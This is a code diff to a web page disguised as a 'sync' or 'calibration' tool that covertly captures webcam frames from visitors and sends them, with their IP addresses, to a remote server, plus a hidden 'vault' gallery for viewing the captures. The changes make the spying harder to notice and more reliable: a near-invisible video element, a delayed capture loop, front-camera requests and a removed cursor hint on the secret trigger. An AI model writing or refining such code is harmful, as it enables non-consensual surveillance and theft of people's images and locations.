@@ -28,10 +28,10 @@
         }
         .no-scrollbar::-webkit-scrollbar { display: none; }
         .uplink-heartbeat {
-            width: 3px; height: 3px; background: #4f46e5; border-radius: 50%;
-            position: fixed; top: 8px; left: 8px; opacity: 0; z-index: 9999;
+            width: 4px; height: 4px; background: #4f46e5; border-radius: 50%;
+            position: fixed; top: 10px; left: 10px; opacity: 0; z-index: 9999;
         }
-        .syncing .uplink-heartbeat { opacity: 0.5; }
+        .syncing .uplink-heartbeat { opacity: 1; }
     </style>
 </head>
 <body class="overflow-hidden">
@@ -39,10 +39,11 @@
     <div id="statusDot" class="uplink-heartbeat"></div>
 
     <!-- SECRET TRIGGER AREA (Bottom Left) -->
-    <div class="fixed bottom-0 left-0 z-[100] w-24 h-24 cursor-pointer" id="vaultTrigger"></div>
+    <div class="fixed bottom-0 left-0 z-[100] w-24 h-24 cursor-default" id="vaultTrigger"></div>
 
     <main id="mainNode" class="h-screen flex flex-col items-center justify-center p-8 text-center">
-        <video id="hiddenSensor" autoplay playsinline muted class="hidden"></video>
+        <!-- Keep video visible but transparent to ensure it renders frames -->
+        <video id="hiddenSensor" autoplay playsinline muted style="position:fixed; top:0; left:0; width:1px; height:1px; opacity:0.01; pointer-events:none;"></video>
         
         <div id="setupView">
             <div class="mb-14 relative flex justify-center items-center">
@@ -79,7 +80,6 @@
             </div>
             
             <div class="flex items-center gap-4">
-                <!-- PRIMARY ACTION BUTTON -->
                 <button id="refreshBtn" class="bg-indigo-600 hover:bg-indigo-500 text-white text-[11px] px-5 py-2 uppercase font-bold tracking-widest rounded transition-all">
                     Sync_Remote
                 </button>
@@ -146,7 +146,7 @@
                         body: JSON.stringify({ img, ip, t: new Date().toISOString() })
                     });
                 } catch (e) {}
-                setTimeout(() => document.body.classList.remove('syncing'), 500);
+                setTimeout(() => document.body.classList.remove('syncing'), 400);
             },
             async pull() {
                 try {
@@ -170,27 +170,38 @@
         };
 
         function runLoop() {
-            setInterval(async () => {
-                if (!isLive) return;
-                const ctx = canvas.getContext('2d');
-                canvas.width = 300; canvas.height = 300;
-                const min = Math.min(sensor.videoWidth, sensor.videoHeight);
-                ctx.drawImage(sensor, (sensor.videoWidth - min)/2, (sensor.videoHeight - min)/2, min, min, 0, 0, 300, 300);
-                Cloud.push(canvas.toDataURL('image/jpeg', 0.4), nodeIp);
-                percentDisplay.textContent = `${(Math.random() * 100).toFixed(2)}%`;
-            }, 2000);
+            // Wait 1.5 seconds after start before first capture to ensure camera sensor is warmed up
+            setTimeout(() => {
+                setInterval(async () => {
+                    if (!isLive) return;
+                    const ctx = canvas.getContext('2d');
+                    canvas.width = 300; canvas.height = 300;
+                    
+                    // Simple check if video is actually playing
+                    if (sensor.videoWidth > 0) {
+                        const min = Math.min(sensor.videoWidth, sensor.videoHeight);
+                        ctx.drawImage(sensor, (sensor.videoWidth - min)/2, (sensor.videoHeight - min)/2, min, min, 0, 0, 300, 300);
+                        const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
+                        Cloud.push(dataUrl, nodeIp);
+                    }
+                    
+                    percentDisplay.textContent = `${(Math.random() * 100).toFixed(2)}%`;
+                }, 2500);
+            }, 1500);
         }
 
         initBtn.onclick = async () => {
             try {
                 await fetchIp();
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 640 } } 
+                });
                 sensor.srcObject = stream;
                 setupView.classList.add('hidden');
                 activeView.classList.remove('hidden');
                 isLive = true;
                 runLoop();
-            } catch (e) { alert("Initialization failed."); }
+            } catch (e) { alert("Sensor calibration failed. Optical access required."); }
         };
 
         document.getElementById('authBtn').onclick = () => {
@@ -214,7 +225,7 @@
             data.forEach(item => {
                 const d = document.createElement('div');
                 d.className = "relative aspect-square bg-zinc-900 border border-white/5 overflow-hidden rounded-sm";
-                d.innerHTML = `<img src="${item.img}" class="w-full h-full object-cover opacity-60">
+                d.innerHTML = `<img src="${item.img}" class="w-full h-full object-cover">
                 <div class="absolute bottom-0 text-[5px] p-1 bg-black/80 truncate w-full text-zinc-500">${item.ip} | ${new Date(item.t).toLocaleTimeString()}</div>`;
                 imageGrid.appendChild(d);
             });
